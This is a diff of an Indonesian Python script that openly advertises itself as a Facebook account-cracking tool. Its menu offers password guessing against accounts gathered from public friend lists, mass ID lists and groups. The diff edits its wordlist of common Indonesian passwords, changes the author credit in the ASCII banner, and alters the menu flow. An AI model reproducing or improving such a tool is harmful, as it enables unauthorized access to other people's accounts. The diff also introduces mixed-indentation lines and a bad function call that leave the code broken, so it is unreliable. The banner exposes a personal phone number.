@@ -3,6 +3,7 @@
 #Jangan DiPerjual Belikan#
 #Free Scrip#
 #Facebook -> Teddy Cahyo Putra Pangembara <- #
+
 import requests,bs4,json,os,sys,random,datetime,time,re
 try:
 	import rich
@@ -151,7 +152,7 @@ def login_lagi():
 def menu_test():
 	jalan('Wait....... ')
 	print('>_Selamat Datang')
-	print('[01] >_Menu Scrip StrovmirViaska V7')
+	menu('[01] >_Menu Scrip StrovmirViaska V7')
 	print('[02] >_Menu BOT')
 	print('[00] >_Exit') 
 	kanjut = input('>_Pilih  :')
@@ -226,10 +227,10 @@ def menu():
 	sg = '>_Menu Tools Crack Facebook'
 	fx = mark(sg, style='red')
 	sol().print(fx)
-	#print(x+'['+h+'•'+x+'] \033[0;33m>_Nama Kamu  : '+str(my_name))
-	#print(x+'['+h+'•'+x+'] \033[0;33m>_ID Kamu    : '+str(my_id))
-	#print(x+'['+h+'•'+x+'] \033[33m>_Tanggal Kamu  : '+str(birth))
-	#print(x+'['+h+'•'+x+'] \033[33m>_IP Kamu   : '+str(sh['origin']))
+	  print(x+'['+h+'•'+x+'] \033[0;33m>_Nama Kamu  : '+str(my_name))
+	  print(x+'['+h+'•'+x+'] \033[0;33m>_ID Kamu    : '+str(my_id))
+	  print(x+'['+h+'•'+x+'] \033[33m>_Tanggal Kamu  : '+str(birth))
+	  print(x+'['+h+'•'+x+'] \033[33m>_IP Kamu   : '+str(sh['origin']))
 	io = '\x1b[1;95m[01] >_Crack Dari Pertemanan Publik\n\x1b[1;95m[02] >_Crack ID Dari Akun Publik (Massal) \n\x1b[1;95m[03] >_Crack Dari Grup\n\x1b[1;95m[04] >_Cek Hasil Crack\n\033\x1b[1;95m[05] >_Cek Hasil Crack [00] >_Keluar'
 	oi = nel(io, style='cyan')
 	cetak(nel(oi, title='>_Pilih 1 Sampai 8'))
@@ -256,7 +257,7 @@ def menu():
 	else:
 		ric = '>_Pilih Yang Benar'
 		sol().print(mark(ric, style='red'))
-		exit()
+		menu_test()
 
 def dump():
 	try:
@@ -602,7 +603,7 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123']
+			pwv = ['sayang','indonesia','sayang123','bismillah','anjing','katasandi','bangsat']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
@@ -1454,12 +1455,12 @@ def kontol():
 \33[37m░╚═══██╗░░░██║░░░██╔══██╗░╚████╔╝░
 \33[37m██████╔╝░░░██║░░░██║░░██║░░╚██╔╝░░
 \33[37m╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░░░╚═╝░░░
-\x1b[0;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
+\x1b[0;34m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
 \x1b[0;34m█  \33[mGithub: https://github.com/Strv11   
-\x1b[0;34m█  \33[mFacebook: Strovmirviaska            
+\x1b[0;34m█  \33[mFacebook: Teddy Cahyo Putra Pangembara           
 \x1b[0;34m█  \33[mWhatsApp: 082290885204             
 \x1b[0;34m█  \33[mTools : \33[1;96mPremium V7    
-\x1b[0;34m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█""")
+\x1b[0;34m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█""")
 def janda_sebalah():#line:42
   try :#line:43
     os .system ('clear')
